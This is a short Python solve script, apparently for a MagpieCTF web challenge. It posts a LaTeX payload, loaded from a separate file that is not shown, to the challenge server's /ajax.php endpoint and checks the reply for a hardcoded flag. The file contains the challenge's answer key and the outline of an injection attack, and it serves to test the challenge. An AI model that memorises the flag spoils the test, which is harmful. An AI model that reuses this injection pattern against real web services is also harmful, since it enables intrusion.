import os, requests

def solve() -> bool:
    flag = "magpie{r1ch4rd_l0v35_t0_5w34t}"
    challenge_host = "http://web01.magpiectf.ca:9949"

    infile = open(os.path.join(os.path.dirname(__file__), "assets/latex-solve.txt"))
    latex = infile.read()
    
    r = requests.post(challenge_host + "/ajax.php", data={"content": latex})

    infile.close()

    return flag in r.text

